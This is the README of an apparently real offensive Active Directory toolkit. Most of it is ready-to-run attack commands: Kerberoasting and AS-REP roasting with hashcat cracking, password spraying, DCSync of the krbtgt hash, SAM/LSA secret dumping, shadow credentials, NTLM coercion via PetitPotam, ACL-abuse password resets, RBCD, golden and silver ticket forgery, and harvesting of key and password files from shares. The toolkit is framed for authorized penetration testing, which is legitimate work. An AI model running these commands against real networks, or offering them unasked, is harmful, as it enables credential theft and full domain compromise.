# ADReaper v4.4.7 — Active Directory Red Team Toolkit

![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=for-the-badge&logo=go)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue?style=for-the-badge&logo=windows)
![Version](https://img.shields.io/badge/Version-4.4.7-red?style=for-the-badge)

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
```

**ADReaper** is a professional-grade, high-performance Active Directory reconnaissance and exploitation toolkit written in Go. Designed for Red Teams and senior penetration testers, it provides a unified interface for the entire AD attack chain—from initial infrastructure discovery to advanced credential harvesting and domain dominance.

> ⚠️ **IMPORTANT**: This tool is for authorized security testing and educational purposes only. Unauthorized use against systems you do not have explicit permission to test is illegal.

---

## Features

### Enumeration (`enum`)

| Module | Capability |
|---|---|
| **enum users** | All AD users with UAC analysis, SPN detection, delegation flags, AS-REP |
| **enum computers** | Computer accounts: DCs, LAPS, unconstrained delegation |
| **enum groups** | Group memberships, AdminSDHolder-protected groups, full descriptions |
| **enum shares** | SMB share enumeration with read/write access test (signing-aware fallback) |
| **enum acls** | Dangerous ACL analysis: GenericAll, WriteDACL, WriteOwner, DCSync rights |
| **enum trusts** | Domain trust relationships with SID-filtering status |
| **enum domain** | Domain password policy, lockout policy, machine account quota |
| **enum adcs** | ADCS Certificate Authorities + ESC1-ESC4 template detection |
| **enum local-admins** | GPO-based local admin hunting — no host scanning, DC-only |
| **enum tree** | Visual filesystem tree of SMB shares (SYSVOL, C$, all shares) |
| **enum all** | High-level domain radiography: aggregate counts for all object types |
| **enum dump** | Full extraction of ALL users, computers, and groups in categorized tables |

### Attacks (`attack`)

| Module | Capability |
|---|---|
| **attack kerberoast** | Kerberoasting → `$krb5tgs$23$` hashes (Hashcat mode 13100) |
| **attack asreproast** | AS-REP Roasting → `$krb5asrep$23$` hashes (Hashcat mode 18200) |
| **attack spray** | Lockout-aware password spraying via Kerberos AS-REQ |
| **attack dcsync** | DCSync via DRSUAPI — replicate NTLM hashes from any DC |
| **attack secretsdump** | SAM/LSA/DCC2 extraction via Remote Registry over SMB |
| **attack harvest** | Recursive SMB share spider — auto-download files by extension |
| **attack shadow** | Shadow Credentials — inject msDS-KeyCredentialLink for PKINIT TGT |
| **attack relay** | Coerce machine auth: PetitPotam (MS-EFSR) / PrinterBug (MS-RPRN) |
| **attack gpp** | GPP cpassword decryption from SYSVOL (MS14-025) |
| **attack acl-abuse** | Exploit ACLs: ForceChangePassword, GenericWrite (add SPN) |
| **attack rbcd** | Resource-Based Constrained Delegation attack |
| **attack tickets** | Kerberos Ticket Factory: forge Golden, Silver, or Diamond tickets |

### Infrastructure (`infra`)

| Module | Capability |
|---|---|
| **infra scan** | Multi-threaded TCP port scanner with service detection and OS fingerprinting |
| **infra dns** | Enumerate Domain Controllers and Global Catalogs via SRV DNS records |

### BloodHound (`bloodhound`)

| Module | Capability |
|---|---|
| **bloodhound collect** | SharpHound-compatible JSON collection (users, groups, computers, GPOs, OUs, ACLs) |
| **bloodhound ingest** | Direct Neo4j Bolt ingestion into BloodHound CE |

### Other Commands

| Module | Capability |
|---|---|
| **whoami** | Display current user's DN, group memberships, and privilege level |
| **autopilot** | Fully automated engagement (infra → enum → BloodHound → harvest → HTML report) |
| **version** | Print version and build info |

## 💎 The Console Experience

ADReaper provides a rich, colored terminal interface with real-time feedback and professional report formatting.

### SMB Global Tree View (Recursive)
```text
── SMB Tree: BankDataTemporal ──────────────────────────────────
[*] Connecting to SMB share...

└── BankDataTemporal/
    ├── Policies/ (Access Denied)
    ├── Bank-Statement-Template-3-Lab.pdf
    ├── bank-statement-template-02.xlsx
    ├── bank-statement-template-05.xlsx
    └── Archive/
        └── old_passwords.txt
```

---

## Quick Start

### Prerequisites

- Go 1.22+  *(for building from source)*
- Windows x64 is supported directly via the provided `.exe` release
- Network access to target DC

### Install & Build

```bash
# Clone the repository
git clone https://github.com/youruser/adreaper.git
cd adreaper

# Install dependencies and build
go mod tidy
go build -o adreaper.exe main.go
```

---

## 🧪 Banking Lab Setup

To test ADReaper in a realistic scenario, use the provided laboratory setup script. It creates 120+ users, banking security groups, and injects several critical attack vectors.

```powershell
# Run on a Domain Controller or machine with AD modules
.\setup_adreaper_lab.ps1
```

---

## Global Flags

```
  -d, --domain string      Target AD domain FQDN          (e.g. corp.local)
      --dc-ip string       Domain Controller IPv4 address  (e.g. 10.10.10.1)
  -u, --username string    AD username for authentication
  -p, --password string    Plaintext password
      --hash string        NTLM hash for Pass-the-Hash    (format: LM:NT or just NT)
      --ldaps              Use LDAPS (TLS, port 636) instead of plain LDAP
  -o, --output string      Mirror ALL session output to a .txt file (auto-appends .txt)
      --workspace string   Directory for JSON evidence files (default: ./workspace)
      --json               Output results as JSON
  -v, --verbose            Enable verbose/debug output
```

---

## Authentication Modes

```bash
# Standard credentials
adreaper enum users -d corp.local --dc-ip 10.10.10.1 -u user -p 'P@ssword'

# Pass-the-Hash (NTLM)
adreaper enum users -d corp.local --dc-ip 10.10.10.1 -u Administrator --hash aad3b435b51404ee:31d6cfe0d16ae931

# With LDAPS
adreaper enum users -d corp.local --dc-ip 10.10.10.1 -u user -p pass --ldaps
```

---

## Session Logging

Mirror everything to a `.txt` file with `-o`:

```bash
# Output saved to "recon.txt"
adreaper enum all -d corp.local --dc-ip 10.10.10.1 -u user -p pass -o recon

# Full dump saved to "full_dump.txt"
adreaper enum dump -d corp.local --dc-ip 10.10.10.1 -u user -p pass -o full_dump
```

---

## Usage Examples

### Enumeration

```bash
# Quick domain overview (all object counts)
adreaper enum all -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# Full dump — all users, computers, groups in categorized tables
adreaper enum dump -d corp.local --dc-ip 10.10.10.1 -u user -p pass -o dump.txt

# Users — Kerberoastable targets
adreaper enum users -d corp.local --dc-ip 10.10.10.1 -u user -p pass --spn-only

# Users — AS-REP roastable (no pre-auth required)
adreaper enum users -d corp.local --dc-ip 10.10.10.1 -u user -p pass --asrep-only

# Users — accounts with unconstrained/constrained delegation
adreaper enum users -d corp.local --dc-ip 10.10.10.1 -u user -p pass --deleg

# Computers — flag DCs, LAPS, and unconstrained delegation machines
adreaper enum computers -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# Groups — find group by name (substring, locale-aware)
adreaper enum groups -d corp.local --dc-ip 10.10.10.1 -u user -p pass --name "Domain Admins"

# Dangerous ACLs (DCSync rights, WriteDACL, GenericAll on Domain Admins)
adreaper enum acls -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# ADCS enumeration — ESC1-ESC4
adreaper enum adcs -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# Local admin hunting via GPO — no host scanning required
adreaper enum local-admins -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# SMB share list (with signing-aware fallback for hardened DCs)
adreaper enum shares -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# SYSVOL filesystem tree (depth 5)
adreaper enum tree -d corp.local --dc-ip 10.10.10.1 -u user -p pass --share SYSVOL --depth 5

# Domain context (functional level, password policy, MAQ)
adreaper enum domain -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# Trust relationships
adreaper enum trusts -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# Whoami — current user's DN, groups, and privilege level
adreaper whoami -d corp.local --dc-ip 10.10.10.1 -u user -p pass
```

### Attacks

```bash
# Kerberoasting — capture TGS hashes
adreaper attack kerberoast -d corp.local --dc-ip 10.10.10.1 -u user -p pass
# Crack: hashcat -m 13100 kerberoast.txt rockyou.txt

# AS-REP Roasting (no creds required!)
adreaper attack asreproast -d corp.local --dc-ip 10.10.10.1
# Crack: hashcat -m 18200 asrep.txt rockyou.txt

# Password spraying (lockout-aware, 5-second delay)
adreaper attack spray -d corp.local --dc-ip 10.10.10.1 --password 'Summer2024!' --delay 5

# DCSync — dump krbtgt NTLM hash (requires DCSync rights)
adreaper attack dcsync -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --user krbtgt

# SecretsDump — dump SAM/LSA via Remote Registry (requires local admin)
adreaper attack secretsdump -d corp.local --dc-ip 10.10.10.1 -u admin -p pass

# GPP Password decryption from SYSVOL (MS14-025)
adreaper attack gpp -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# File harvesting — download by extension from all shares
adreaper attack harvest -d corp.local --dc-ip 10.10.10.1 -u user -p pass --ext kdbx,ppk,docx

# Shadow Credentials — inject msDS-KeyCredentialLink for PKINIT TGT
adreaper attack shadow -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target svc-admin

# Coerce NTLM authentication (use with ntlmrelayx)
adreaper attack relay -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target 10.10.10.1 --method petitpotam

# ACL abuse — reset password (requires ForceChangePassword right)
adreaper attack acl-abuse -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target jsmith --action reset-password --value 'NewP@ss!'

# ACL abuse — add SPN (requires GenericWrite) → then Kerberoast
adreaper attack acl-abuse -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target svc-iis --action add-spn --value http/attacker

# RBCD — configure Resource-Based Constrained Delegation
adreaper attack rbcd -d corp.local --dc-ip 10.10.10.1 -u user -p pass --target SRV-01 --machine ATTACK$

# Golden Ticket — forge a TGT with krbtgt hash
adreaper attack tickets --type golden -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --user Administrator --sid S-1-5-21-... --hash <krbtgt_ntlm>

# Silver Ticket — forge a service ticket
adreaper attack tickets --type silver -d corp.local --dc-ip 10.10.10.1 -u admin -p pass --user Administrator --sid S-1-5-21-... --hash <svc_ntlm> --spn cifs/dc01.corp.local
```

### Infrastructure

```bash
# Port scan (top 20 AD ports + OS fingerprint)
adreaper infra scan --dc-ip 10.10.10.1

# Full port scan with aggressive fingerprinting
adreaper infra scan --dc-ip 10.10.10.1 --ports all -A

# Specific ports, save to file
adreaper infra scan --dc-ip 10.10.10.1 --ports 80,443,445,3389 --save scan.txt

# DNS enumeration — find DCs and Global Catalogs via SRV
adreaper infra dns -d corp.local
```

### BloodHound

```bash
# Collect BloodHound data → JSON files (SharpHound-compatible format)
adreaper bloodhound collect -d corp.local --dc-ip 10.10.10.1 -u user -p pass

# Ingest directly into BloodHound CE via Neo4j Bolt
adreaper bloodhound ingest -d corp.local --dc-ip 10.10.10.1 -u user -p pass \
  --neo4j-uri bolt://localhost:7687 --neo4j-user neo4j --neo4j-pass bloodhound

# Collected data saved to: workspace/<domain>/
# Import JSON files into BloodHound CE UI → Upload Data
```

**BloodHound data collected:**
- Users (with SID, title, department, mail, UAC flags)
- Computers (with OS, DNS, DC status)
- Groups (with memberships and AdminSDHolder status)
- GPOs and OUs with links
- Security Descriptors (ACLs) for attack path inference

### Autopilot

```bash
# Fully automated engagement (all phases)
adreaper autopilot -d corp.local --dc-ip 10.10.10.1 -u admin -p pass

# With session log
adreaper autopilot -d corp.local --dc-ip 10.10.10.1 -u admin -p pass -o autopilot_log
```

**Phases:**
1. Infrastructure port scan + OS detection
2. AD enumeration (users, groups, ADCS)
3. BloodHound data collection
4. File harvesting (SYSVOL, sensitive shares)
5. HTML engagement report generation

---

## Architecture

```
adreaper/
├── cmd/                        # Cobra CLI layer
│   ├── root.go                 # Global flags: domain, dc-ip, user, pass, hash, output
│   ├── enum.go                 # enum {users,computers,groups,shares,acls,trusts,domain,adcs,tree,local-admins,all,dump}
│   ├── attack.go               # attack {kerberoast,asreproast,spray,dcsync,secretsdump,harvest,shadow,relay,gpp,acl-abuse,rbcd,tickets}
│   ├── infra.go                # infra {scan,dns}
│   ├── bloodhound.go           # bloodhound {collect,ingest}
│   ├── whoami.go               # whoami
│   └── autopilot.go            # autopilot
├── internal/
│   ├── config/config.go        # Options struct, BaseDN(), LDAPAddr()
│   ├── output/console.go       # Banner (gradient), colored output, table renderer, session logger
│   ├── recon/
│   │   ├── ldap.go             # LDAP client + Windows SD ACL parser
│   │   ├── dns.go              # DNS: SRV records, zone transfer, PTR
│   │   ├── smb.go              # SMB2/3: share enum (signing fallback), SYSVOL walker, tree
│   │   ├── scanner.go          # TCP port scanner + OS/service fingerprinting
│   │   ├── kerberos.go         # Kerberos: TGS requests, user enum
│   │   └── local_admins.go     # GPO-based local admin hunting (SYSVOL parser)
│   ├── attacks/
│   │   ├── kerberoast.go       # LDAP→Kerberos→Hashcat hash pipeline
│   │   ├── asreproast.go       # AS-REP target identification + hash extraction
│   │   ├── spray.go            # Lockout-aware password spraying
│   │   ├── dcsync.go           # DCSync via DRSUAPI
│   │   ├── secrets.go          # SAM/LSA dump via Remote Registry
│   │   ├── harvest.go          # Recursive SMB file harvesting
│   │   ├── shadow.go           # Shadow Credentials (msDS-KeyCredentialLink)
│   │   ├── relay.go            # NTLM coercion triggers (PetitPotam/PrinterBug)
│   │   ├── gpp.go              # GPP cpassword decryption
│   │   ├── acl_abuse.go        # ForceChangePassword, GenericWrite exploits
│   │   ├── rbcd.go             # RBCD delegation configuration
│   │   ├── tickets.go          # Golden/Silver/Diamond Kerberos ticket forgery
│   │   └── utils.go            # Hash file saving utilities
│   ├── bloodhound/
│   │   ├── collector.go        # AD collection → SharpHound-compatible JSON format
│   │   └── ingestor.go         # Neo4j Bolt direct ingestion
│   ├── workspace/workspace.go  # Evidence file management
│   └── report/report.go        # JSON + HTML report generation
└── main.go
```

---

## Evidence Management

All evidence is saved to `./workspace/<domain>/` by default:
- `users.json` — full user attribute dump
- `computers.json` — computer accounts
- `adcs_templates.json` — certificate templates
- `engagement.log` — timestamped action log
- BloodHound JSON files (timestamped, import into BloodHound CE)
- `harvest/` — files downloaded from SMB shares
- `shadow/` — Shadow Credential certificates and keys
- `engagement_report.html` — Autopilot HTML report

---

## Complementary Tools

ADReaper is designed to work alongside:

| Tool | Purpose |
|---|---|
| [BloodHound CE](https://github.com/SpecterOps/BloodHound) | AD attack path visualization |
| [Certipy](https://github.com/ly4k/Certipy) | ADCS exploitation (ESC1-ESC8) |
| [Impacket](https://github.com/fortra/impacket) | Protocol-level AD attacks + ntlmrelayx |
| [Hashcat](https://hashcat.net) | Offline hash cracking |
| [kerbrute](https://github.com/ropnop/kerbrute) | Fast Kerberos user enumeration |

---

## License

For authorized penetration testing and red team operations only.
© 2026 — ADReaper Project
